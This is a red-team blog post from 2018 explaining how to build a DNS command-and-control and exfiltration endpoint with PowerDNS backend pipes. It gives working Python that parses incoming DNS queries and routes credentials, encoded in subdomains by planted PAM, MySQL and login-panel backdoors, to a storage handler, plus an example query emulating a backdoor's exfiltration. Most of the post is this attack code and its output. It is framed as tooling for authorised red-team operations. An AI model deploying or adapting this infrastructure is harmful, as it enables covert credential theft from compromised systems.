---
layout: post
title: Building simple DNS endpoints for exfiltration or C&C
date: 2018-11-09 15:00:00
categories: posts
en: true
description: Brief tutorial of how to use backend pipes in PowerDNS for exfiltration
keywords: "dns, Red Team, RedTeam, exfiltration, cover-channel, backend pipe, powerdns, pdns"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DNS as a cover-channel is a well-known technique used widely in pentests and Red Team operations to bypass network restrictions. For example, in my post [Exfiltrating credentials via PAM backdoors & DNS requests](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/) an authoritative DNS server owned by us is used as endpoint to catch and store stolen credentials via a PAM backdoor, but... How can we deploy a simple endpoint to handle the incoming DNS requests?


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When I had to develop malware for some operation of the Red Team, I relied on DNSlib to manage the DNS component of C&C. But it can be tedious to program everything from scratch, so I found another way to implement these functions in a pain-less way. Indeed an endpoint for exfiltration like [Arecibo](https://github.com/TarlogicSecurity/Arecibo) can be developed in 10 minutes or less. Lets enjoy the magic of PowerDNS and its backend pipes!


## 0x01 Introduction
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[PowerDNS](https://www.powerdns.com/) is an open source DNS software with a cool functinality called "backend pipe" that allows us to work with DNS requests from an external program. Our program (in our example is going to be a python script) communicates with PowerDNS via STDIN/STDOUT: PowerDNS send to us the key information from a DNS request (STDIN), we process it and answer it via STDOUT. Simple as hell, you do not need to worry about parse nothing: everything is made automagically in background. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Install powerdns and its backend support (in your distro it must be something similar to pdns & pdns-backend-pipe), create a .py file and give to it execution perms. Edit pdns.conf:

```
launch=pipe
pipe-command=/your/path/backend-dns.py
```

## 0x02 Handling the basic
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As we said before the communication between our script and PowerDNS is made via STDIN/STDOUT via tokenized messages. Every portion of the message is tokenized using '\t' as separator. To see it better:

```python
 from sys import stdin, stdout, stderr


 # Alive check
 stderr.write( stdin.readline() ) # Use STDERR to print debug info
 stderr.flush()
 stdout.write("Alive!\n")
 stdout.flush()
 while True:
     request = stdin.readline()
     stderr.write(request + "\n")
     stderr.flush()

```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Now run a nslookup:

```
mothra@arcadia:/tmp|⇒  nslookup
> server 127.0.0.1
Default server: 127.0.0.1
Address: 127.0.0.1#53
> gamusinos.net
Server:         127.0.0.1
Address:        127.0.0.1#53

** server can't find gamusinos.net: SERVFAIL
>

```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In our pdns_server instance we can see now the tokenized message (`Q       gamusinos.net   IN      SOA     -1      127.0.0.1`). PowerDNS did all the magic, we only need to check the kind of request (SOA in the example) and answer accordingly (just put DATA as your message type and finish it with "END"):

```python
 #!/usr/bin/python

 from sys import stdin, stdout, stderr



 # Basic configuration
 domain = "gamusinos.net"
 ttl = "432000"
 ipaddress = "127.0.0.1"
 ids = "1"
 hostmaster="crazy-gamusino@narnia.net"
 soa = '%s %s %s' % ("ns1." + domain, hostmaster, ids)

 # Read STDIN and split tokens
 def readLine():
         data = stdin.readline()
         tokens = data.strip().split("\t")
         return tokens

 # Handle SOA request
 def handleSoa(qname):
         stdout.write("DATA\t" + qname + "\tIN\tSOA\t" + ttl + "\t" + ids + "\t" + soa + "\n")
         stdout.write("END\n")
         stdout.flush()

 # Alive check
 stderr.write( stdin.readline() ) # Use STDERR to print debug info
 stderr.flush()
 stdout.write("Alive!\n")
 stdout.flush()

 # Read incoming requests
 while True:
         indata = readLine() # Extract info from request
         if len(indata) < 6: # Weird thing, not the kind of message we want
                 continue
         qname = indata[1].lower() # Name queried (QNAME)
         qtype = indata[3] # Resource being requested (QTYPE)
         # Check if the request is for us
         if qname.endswith(domain):
                 # If this is ok, then we can answer the request based on the QTYPE
                 if qtype == "SOA":
                         stderr.write("[+] SOA request\n") # Just to debug :)
                         stderr.flush()
                         handleSoa(qname)

```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Now your backend can answer SOA requests:

```
mothra@arcadia:/tmp|⇒  dig SOA @127.0.0.1 gamusinos.net

; <<>> DiG 9.10.3-P4-Debian <<>> SOA @127.0.0.1 gamusinos.net
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64957
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1680
;; QUESTION SECTION:
;gamusinos.net.                 IN      SOA

;; ANSWER SECTION:
gamusinos.net.          432000  IN      SOA     ns1.gamusinos.net. crazy-gamusino.narnia.net. 1 10800 3600 604800 3600

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Sat Nov 10 22:53:10 CET 2018
;; MSG SIZE  rcvd: 104
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Amazing how easy and simple is to handle DNS requests! **:)**

## 0x03 Newton's Third Law
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We need to code simple rules in our shiny DNS backend to trigger arbitrary actions. The imagination is the only barrier to perfom it: you can use subdomains to indicate a "command" (store a credential, run a program, whatever...), or maybe just encode the action in the few first bytes of a subdomain, etc. We are going (just as an example) use the first two bytes from a subdomain resolution to determine the actions. So, imagine that during a Red Team operation few backdoors are deployed in different servers and services (a PAM module to extract SSH credentials, an UDF + trigger in MySQL to retrieve credentials used in a login panel, etc.) and they exfiltrate the credentials to us via DNS resolutions. Something like this can do the job:

```python
#!/usr/bin/python

 from sys import stdin, stdout, stderr

 # Basic configuration
 domain = "gamusinos.net"
 ttl = "432000"
 ipaddress = "127.0.0.1"
 ids = "1"
 hostmaster="crazy-gamusino@narnia.net"
 soa = '%s %s %s' % ("ns1." + domain, hostmaster, ids)

 # Read STDIN and split tokens
 def readLine():
         data = stdin.readline()
         tokens = data.strip().split("\t")
         return tokens

 # Handle basic requests
 def handleSoa(qname):
         stdout.write("DATA\t" + qname + "\tIN\tSOA\t" + ttl + "\t" + ids + "\t" + soa + "\n")
         stdout.write("END\n")
         stdout.flush()

 def handleNS(qname):
         stdout.write("DATA\t" + qname + "\tIN\tA\t" + ttl + "\t" + ids + "\t" + "\t" + ipaddress + "\n")
         stdout.write("END\n")
         stdout.flush()

 def handleA(qname, ip):
         stdout.write("DATA\t" + qname + "\tIN\tA\t" + ttl + "\t" + ids + "\t" + ip + "\n")
         stdout.write("DATA\t" + qname +  "\tIN\tNS\t" + ttl + "\t" + ids + "\t" + "ns1." + domain + "\n")
         stdout.write("DATA\t" + qname +  "\tIN\tNS\t" + ttl + "\t" + ids + "\t" + "ns2." + domain + "\n")
         stdout.write("END\n")
         stdout.flush()

 def saveCredential(qname):
         stderr.write("  [+] Storing new credential!\n")
         stderr.flush()
         if qname[0] == "a":
                 stderr.write("  - Credential from PAM backdoor\n")
                 stderr.flush()
                 # Do things to decrypt and save to a database
         elif qname[0] == "b":
                 stderr.write("  - Credential from MySQL backdoor\n")
                 stderr.flush()
         elif qname[0] == "c":
                 stderr.write("  - Credential from Login backdoor\n")
                 stderr.flush()
         else:
                 stderr.write("  - ERROR\n")
                 stderr.flush()
         # Answer the request
         handleA(qname, ipaddress)

# Alive check
 stderr.write( stdin.readline() ) # Use STDERR to print debug info
 stderr.flush()
 stdout.write("Alive!\n")
 stdout.flush()

 # Read incoming requests
 while True:
         indata = readLine() # Extract info from request
         if len(indata) < 6: # Weird thing, not the kind of message we want
                 continue
         qname = indata[1].lower() # Name queried (QNAME)
         qtype = indata[3] # Resource being requested (QTYPE)
         # Check if the request is for us
         if qname.endswith(domain):
                 # If this is ok, then we can answer the request based on the QTYPE
                 if qtype == "SOA":
                         stderr.write("[+] SOA request\n") # Just to debug :)
                         stderr.flush()
                         handleSoa(qname)
                 if (qtype == "A" or qtype == "ANY"):
                         stderr.write("[+] A or ANY request\n") # Just do debug :)
                         stderr.flush()
                         if qname == domain: # No subdomains
                                 handleA(domain, ipadress)
                         elif (qname == "ns1." + domain or qname == "ns2." + qname): # Asking for NS servers
                                 handleNS(qname)
                         elif (qname.endswith("cdn." + domain)): # xxxx.cdn.gamusino.net
                                 saveCredential(qname)
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Now emulate a request from a MySQL backdoor (`dig A bmandanga.cdn.gamusinos.net`) and enjoy:

```
[+] SOA request
[+] A or ANY request
        [+] Storing new credential!
        - Credential from MySQL backdoor
```

## 0x04 Final Words
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Discovering PowerDNS and backend pipes made my life a lot more easy. Just in few minutes you have a powerfull endpoint ready to work. If you find this article interesting, or spot any error or typo, feel free to contact me at twitter [@TheXC3LL](https://twitter.com/TheXC3LL).
